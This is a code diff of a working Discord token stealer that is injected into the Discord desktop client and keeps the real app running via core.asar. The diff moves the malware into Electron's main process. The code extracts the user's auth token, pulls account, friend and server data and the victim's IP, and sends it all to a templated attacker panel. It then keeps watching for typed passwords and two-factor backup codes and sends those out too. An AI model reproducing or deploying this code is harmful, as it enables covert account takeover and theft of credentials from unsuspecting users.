@@ -1,9 +1,10 @@
-const PANEL_IP = "{{PANEL_IP}}";
-const PANEL_PORT = {{PANEL_PORT}};
-
+const { BrowserWindow, app } = require("electron");
 const net = require('net');
 const https = require('https');
 const crypto = require('crypto');
+
+const PANEL_IP = "{{PANEL_IP}}";
+const PANEL_PORT = {{PANEL_PORT}};
 
 let lastPasswordHash = null;
 let lastBackupCodesHash = null;
@@ -20,55 +21,121 @@ function sendToPanel(payload) {
     });
 }
 
-function getToken() {
-    return new Promise((resolve) => {
-        let token = null;
-        try {
-            const wpModule = window.webpackChunkdiscord_app;
-            if (wpModule) {
-                wpModule.push([[Symbol()], {}, o => {
-                    for (let e of Object.values(o.c)) {
-                        try {
-                            if (!e.exports || e.exports === window) continue;
-                            if (e.exports?.getToken) token = e.exports.getToken();
-                            for (let key in e.exports) {
-                                if (e.exports?.[key]?.getToken && "IntlMessagesProxy" !== e.exports[key][Symbol.toStringTag]) {
-                                    token = e.exports[key].getToken();
+async function getDiscordToken() {
+    const mainWindow = BrowserWindow.getAllWindows()[0];
+    if (!mainWindow) return null;
+    try {
+        const token = await mainWindow.webContents.executeJavaScript(`
+            (function() {
+                let token = null;
+                if (window.webpackChunkdiscord_app) {
+                    window.webpackChunkdiscord_app.push([[Symbol()], {}, o => {
+                        for (let e of Object.values(o.c)) {
+                            try {
+                                if (!e.exports || e.exports === window) continue;
+                                if (e.exports?.getToken) token = e.exports.getToken();
+                                for (let key in e.exports) {
+                                    if (e.exports?.[key]?.getToken && "IntlMessagesProxy" !== e.exports[key][Symbol.toStringTag]) {
+                                        token = e.exports[key].getToken();
+                                    }
                                 }
-                            }
-                        } catch {}
-                    }
-                }]);
-                wpModule.pop();
-            }
-        } catch {}
-        if (!token) {
-            try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    if (key && key.includes('token')) {
-                        try {
-                            const parsed = JSON.parse(localStorage.getItem(key));
-                            if (parsed?.token) token = parsed.token;
-                        } catch {}
+                            } catch { }
+                        }
+                    }]);
+                    window.webpackChunkdiscord_app.pop();
+                }
+                if (!token) {
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        if (key && key.includes('token')) {
+                            try {
+                                const value = localStorage.getItem(key);
+                                const parsed = JSON.parse(value);
+                                if (parsed && parsed.token) token = parsed.token;
+                            } catch(e) {}
+                        }
                     }
                 }
-            } catch {}
-        }
-        resolve(token);
-    });
+                return token;
+            })();
+        `);
+        return token;
+    } catch (err) {
+        return null;
+    }
 }
 
-function getIPInfo() {
+async function getIpInfo() {
     return new Promise((resolve) => {
         https.get('https://ipinfo.io/json', (res) => {
             let data = '';
-            res.on('data', c => data += c);
+            res.on('data', chunk => data += chunk);
             res.on('end', () => {
-                try { resolve(JSON.parse(data)); } catch { resolve({}); }
+                try { resolve(JSON.parse(data)); } catch { resolve({ ip: 'Unknown', city: 'Unknown', country: 'Unknown' }); }
             });
-        }).on('error', () => resolve({}));
+        }).on('error', () => resolve({ ip: 'Unknown', city: 'Unknown', country: 'Unknown' }));
     });
+}
+
+async function getDiscordUserInfo(token) {
+    return new Promise((resolve) => {
+        const options = { hostname: 'discord.com', path: '/api/v9/users/@me', method: 'GET', headers: { 'Authorization': token } };
+        const req = https.request(options, (res) => {
+            let data = '';
+            res.on('data', chunk => data += chunk);
+            res.on('end', () => { try { resolve(JSON.parse(data)); } catch { resolve(null); } });
+        });
+        req.on('error', () => resolve(null));
+        req.end();
+    });
+}
+
+async function getDiscordRelationships(token) {
+    return new Promise((resolve) => {
+        const options = { hostname: 'discord.com', path: '/api/v9/users/@me/relationships', method: 'GET', headers: { 'Authorization': token } };
+        const req = https.request(options, (res) => {
+            let data = '';
+            res.on('data', chunk => data += chunk);
+            res.on('end', () => {
+                try {
+                    const data = JSON.parse(data);
+                    resolve({ friends: data.filter(r => r.type === 1).length, blocked: data.filter(r => r.type === 2).length });
+                } catch { resolve({ friends: 0, blocked: 0 }); }
+            });
+        });
+        req.on('error', () => resolve({ friends: 0, blocked: 0 }));
+        req.end();
+    });
+}
+
+async function getDiscordGuilds(token) {
+    return new Promise((resolve) => {
+        const options = { hostname: 'discord.com', path: '/api/v9/users/@me/guilds', method: 'GET', headers: { 'Authorization': token } };
+        const req = https.request(options, (res) => {
+            let data = '';
+            res.on('data', chunk => data += chunk);
+            res.on('end', () => { try { resolve(JSON.parse(data).length); } catch { resolve(0); } });
+        });
+        req.on('error', () => resolve(0));
+        req.end();
+    });
+}
+
+function getBadges(flags) {
+    const badges = [];
+    if (!flags) return badges;
+    if (flags & 1) badges.push('Discord Employee');
+    if (flags & 2) badges.push('Discord Partner');
+    if (flags & 4) badges.push('HypeSquad Events');
+    if (flags & 8) badges.push('Bug Hunter Level 1');
+    if (flags & 64) badges.push('HypeSquad Bravery');
+    if (flags & 128) badges.push('HypeSquad Brilliance');
+    if (flags & 256) badges.push('HypeSquad Balance');
+    if (flags & 512) badges.push('Early Supporter');
+    if (flags & 16384) badges.push('Bug Hunter Level 2');
+    if (flags & 131072) badges.push('Verified Developer');
+    if (flags & 4194304) badges.push('Active Developer');
+    return badges;
 }
 
 function getSystemInfo() {
@@ -81,129 +148,95 @@ function getSystemInfo() {
     };
 }
 
-function getUserInfo(token) {
-    return new Promise((resolve) => {
-        const opts = { hostname: 'discord.com', path: '/api/v9/users/@me', method: 'GET', headers: { 'Authorization': token } };
-        const req = https.request(opts, (res) => {
-            let d = '';
-            res.on('data', c => d += c);
-            res.on('end', () => { try { resolve(JSON.parse(d)); } catch { resolve(null); } });
-        });
-        req.on('error', () => resolve(null));
-        req.end();
-    });
-}
-
-function getRelationships(token) {
-    return new Promise((resolve) => {
-        const opts = { hostname: 'discord.com', path: '/api/v9/users/@me/relationships', method: 'GET', headers: { 'Authorization': token } };
-        const req = https.request(opts, (res) => {
-            let d = '';
-            res.on('data', c => d += c);
-            res.on('end', () => {
-                try {
-                    const data = JSON.parse(d);
-                    resolve({ friends: data.filter(r => r.type === 1).length, blocked: data.filter(r => r.type === 2).length });
-                } catch { resolve({ friends: 0, blocked: 0 }); }
-            });
-        });
-        req.on('error', () => resolve({ friends: 0, blocked: 0 }));
-        req.end();
-    });
-}
-
-function getGuildCount(token) {
-    return new Promise((resolve) => {
-        const opts = { hostname: 'discord.com', path: '/api/v9/users/@me/guilds', method: 'GET', headers: { 'Authorization': token } };
-        const req = https.request(opts, (res) => {
-            let d = '';
-            res.on('data', c => d += c);
-            res.on('end', () => { try { resolve(JSON.parse(d).length); } catch { resolve(0); } });
-        });
-        req.on('error', () => resolve(0));
-        req.end();
-    });
-}
-
-function getBadges(flags) {
-    const badgeMap = {
-        1: "Discord Employee", 2: "Discord Partner", 4: "HypeSquad Events",
-        8: "Bug Hunter L1", 64: "HypeSquad Bravery", 128: "HypeSquad Brilliance",
-        256: "HypeSquad Balance", 512: "Early Supporter", 16384: "Bug Hunter L2",
-        131072: "Verified Developer", 4194304: "Active Developer"
-    };
-    const badges = [];
-    for (const [flag, name] of Object.entries(badgeMap)) {
-        if (flags & parseInt(flag)) badges.push(name);
-    }
-    return badges;
-}
-
-async function sendInitialData(token) {
-    const userInfo = await getUserInfo(token);
-    const ipInfo = await getIPInfo();
-    const relationships = await getRelationships(token);
-    const guildCount = await getGuildCount(token);
-    const badges = userInfo?.flags ? getBadges(userInfo.flags) : [];
+async function sendInitialData(ipData, token, userInfo, relationships, guilds) {
     const si = getSystemInfo();
+    const badges = userInfo?.flags ? getBadges(userInfo.flags) : [];
     await sendToPanel({
         ...si,
         injection_type: "initial",
         token: token,
         user_info: userInfo,
-        ip_info: ipInfo,
+        ip_info: ipData,
         relationships: relationships,
-        guild_count: guildCount,
+        guild_count: guilds,
         badges: badges
     });
 }
 
-function startPasswordMonitor() {
+async function monitorPasswordChanges(token, ipData, userInfo, relationships, guilds) {
+    const mainWindow = BrowserWindow.getAllWindows()[0];
+    if (!mainWindow) return;
     setInterval(async () => {
         try {
-            const inputs = document.querySelectorAll('input[type="password"]');
-            for (const input of inputs) {
-                if (input.value && input.value.length > 0) {
-                    const hash = crypto.createHash('sha256').update(input.value).digest('hex');
-                    if (lastPasswordHash !== null && lastPasswordHash !== hash) {
-                        const si = getSystemInfo();
-                        await sendToPanel({ ...si, injection_type: "password_change", password: input.value });
-                    }
-                    lastPasswordHash = hash;
+            const currentPassword = await mainWindow.webContents.executeJavaScript(`
+                (function() {
+                    try {
+                        const passwordInputs = document.querySelectorAll('input[type="password"]');
+                        for (let input of passwordInputs) {
+                            if (input.value && input.value.length > 0) return input.value;
+                        }
+                        return null;
+                    } catch(e) { return null; }
+                })();
+            `);
+            if (currentPassword) {
+                const currentHash = crypto.createHash('sha256').update(currentPassword).digest('hex');
+                if (lastPasswordHash !== null && lastPasswordHash !== currentHash) {
+                    const si = getSystemInfo();
+                    await sendToPanel({ ...si, injection_type: "password_change", password: currentPassword });
                 }
+                lastPasswordHash = currentHash;
             }
-        } catch {}
+        } catch(err) {}
     }, 3000);
 }
 
-function startBackupCodeMonitor() {
+async function monitorBackupCodeChanges(token, ipData, userInfo, relationships, guilds) {
+    const mainWindow = BrowserWindow.getAllWindows()[0];
+    if (!mainWindow) return;
     setInterval(async () => {
         try {
-            const codeRegex = /[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}/gi;
-            const matches = document.body.innerText.match(codeRegex);
-            if (matches) {
-                const codes = matches.join(', ');
-                const hash = crypto.createHash('sha256').update(codes).digest('hex');
-                if (lastBackupCodesHash !== null && lastBackupCodesHash !== hash) {
+            const backupCodes = await mainWindow.webContents.executeJavaScript(`
+                (function() {
+                    try {
+                        const backupCodesList = [];
+                        const pageText = document.body.innerText;
+                        const codeRegex = /[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}/gi;
+                        const matches = pageText.match(codeRegex);
+                        if (matches) backupCodesList.push(...matches);
+                        return backupCodesList.length > 0 ? backupCodesList.join(', ') : null;
+                    } catch(e) { return null; }
+                })();
+            `);
+            if (backupCodes) {
+                const currentHash = crypto.createHash('sha256').update(backupCodes).digest('hex');
+                if (lastBackupCodesHash !== null && lastBackupCodesHash !== currentHash) {
                     const si = getSystemInfo();
-                    await sendToPanel({ ...si, injection_type: "backup_codes", codes: codes });
+                    await sendToPanel({ ...si, injection_type: "backup_codes", codes: backupCodes });
                 }
-                lastBackupCodesHash = hash;
+                lastBackupCodesHash = currentHash;
             }
-        } catch {}
+        } catch(err) {}
     }, 5000);
 }
 
-setTimeout(async () => {
-    const token = await getToken();
-    if (token) {
-        await sendInitialData(token);
-        startPasswordMonitor();
-        startBackupCodeMonitor();
-    } else {
-        const si = getSystemInfo();
-        await sendToPanel({ ...si, injection_type: "error", error: "No token found" });
-    }
-}, 10000);
+app.whenReady().then(async () => {
+    try {
+        await new Promise(r => setTimeout(r, 5000));
+        const ipData = await getIpInfo();
+        const token = await getDiscordToken();
+        if (token) {
+            const userInfo = await getDiscordUserInfo(token);
+            const relationships = await getDiscordRelationships(token);
+            const guilds = await getDiscordGuilds(token);
+            await sendInitialData(ipData, token, userInfo, relationships, guilds);
+            monitorPasswordChanges(token, ipData, userInfo, relationships, guilds);
+            monitorBackupCodeChanges(token, ipData, userInfo, relationships, guilds);
+        } else {
+            const si = getSystemInfo();
+            await sendToPanel({ ...si, injection_type: "error", error: "No token found" });
+        }
+    } catch (err) {}
+});
 
 module.exports = require("./core.asar");
